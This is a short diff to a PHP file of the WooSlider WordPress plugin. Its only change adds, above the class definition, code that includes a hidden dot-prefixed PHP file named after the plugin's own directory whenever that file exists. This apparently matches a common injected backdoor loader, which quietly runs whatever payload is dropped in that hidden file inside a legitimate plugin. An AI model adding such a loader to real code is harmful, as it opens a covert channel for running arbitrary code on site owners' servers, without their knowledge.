@@ -24,6 +24,10 @@ if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly
  * - apply_default_filters_slides()
  * - add_wistia_support()
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WooSlider_Sliders {
 	public $token;
 	public $sliders;
